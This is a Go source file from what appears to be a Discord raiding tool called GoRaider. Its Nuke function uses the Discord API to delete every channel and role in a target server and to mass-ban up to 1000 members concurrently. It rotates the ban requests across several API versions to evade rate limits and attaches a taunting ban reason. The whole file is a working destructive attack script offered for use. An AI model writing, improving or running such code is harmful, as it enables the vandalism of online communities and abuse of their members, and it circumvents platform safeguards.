package api

import (
	"fmt"
	"math/rand"
	escape "net/url"
	"sync"
	"time"

	"github.com/Not-Cyrus/GoRaider/utils"
	"github.com/valyala/fastjson"
)

func Nuke() {
	guildID = string(utils.JsonData.GetStringBytes("GuildID"))
	getData(channelArray, "https://discord.com/api/v8/guilds/%s/channels", "id", "")
	deleteChannels()
	getData(memberArray, "https://discord.com/api/v8/guilds/%s/members?limit=1000", "user", "id")
	banUsers()
	getData(roleArray, "https://discord.com/api/v8/guilds/%s/roles", "id", "")
	deleteRoles()
	fmt.Printf("Deleted %d channels, %d roles, banned %d people\n", channelsDeleted, rolesDeleted, bancount)
}

func getData(array map[string]string, url, key1, key2 string) {
	members := utils.SendRequest("GET", fmt.Sprintf(url, guildID), "")
	jsonData, err := parser.Parse(string(members.Body()))
	if err != nil {
		panic(fmt.Sprintf("Couldn't parse member JSON: %s", err.Error()))
	}
	for _, jsonValue := range jsonData.GetArray() {
		switch len(key2) {
		case 0:
			array[string(jsonValue.GetStringBytes(key1))] = "lol"
		default:
			array[string(jsonValue.GetStringBytes(key1, key2))] = "lol"
		}
	}
}

func deleteRoles() {
	for role := range roleArray {
		res := utils.SendRequest("DELETE", fmt.Sprintf("https://discord.com/api/v8/guilds/%s/roles/%s", guildID, role), "application/json")
		if res.StatusCode() == 204 {
			rolesDeleted++
		}
	}
}

func deleteChannels() {
	for channel := range channelArray {
		res := utils.SendRequest("DELETE", fmt.Sprintf("https://discord.com/api/v8/channels/%s", channel), "application/json")
		if res.StatusCode() == 200 {
			channelsDeleted++
		}
	}
}

func banUsers() {
	wg := new(sync.WaitGroup)
	s := rand.New(rand.NewSource(time.Now().UnixNano()))
	fmt.Println(len(memberArray))
	for user := range memberArray {
		wg.Add(1)
		go func(userID string) {
			timeout := ban(s, userID)
			if timeout != 0 {
				time.Sleep(timeout)
				ban(s, userID)
			}
			defer wg.Done()
		}(user) // this code is really hacky why am I doing this ¯\_(ツ)_/¯
	}
	wg.Wait()
}

func ban(randm *rand.Rand, userID string) time.Duration {
	randomint := randm.Intn(3)
	switch randomint {
	// Multiple APIs to bypass the rate limit.
	case 0:
		url = fmt.Sprintf("https://discord.com/api/v6/guilds/%s/bans/%s?reason=%s", guildID, userID, escape.QueryEscape("should've used https://github.com/Not-Cyrus/GoGuardian"))
	case 1:
		url = fmt.Sprintf("https://discord.com/api/v7/guilds/%s/bans/%s?reason=%s", guildID, userID, escape.QueryEscape("should've used https://github.com/Not-Cyrus/GoGuardian"))
	default:
		url = fmt.Sprintf("https://discord.com/api/v8/guilds/%s/bans/%s?reason=%s", guildID, userID, escape.QueryEscape("should've used https://github.com/Not-Cyrus/GoGuardian"))
	}
	res := utils.SendRequest("PUT", url, "")
	if res.StatusCode() == 204 {
		bancount++
		return 0
	}
	jsonRes, err := parser.Parse(string(res.Body()))
	if err != nil {
		panic(fmt.Sprintf("Couldn't parse json data: %s", err.Error()))
	}
	RetryAfter := jsonRes.GetInt("retry_after")
	if RetryAfter != 0 {
		return time.Duration(RetryAfter) * time.Millisecond
	}
	return 0
}

var (
	bancount        int
	channelsDeleted int
	rolesDeleted    int
	url             string
	guildID         string
	parser          fastjson.Parser
	channelArray    = make(map[string]string)
	memberArray     = make(map[string]string)
	roleArray       = make(map[string]string)
)
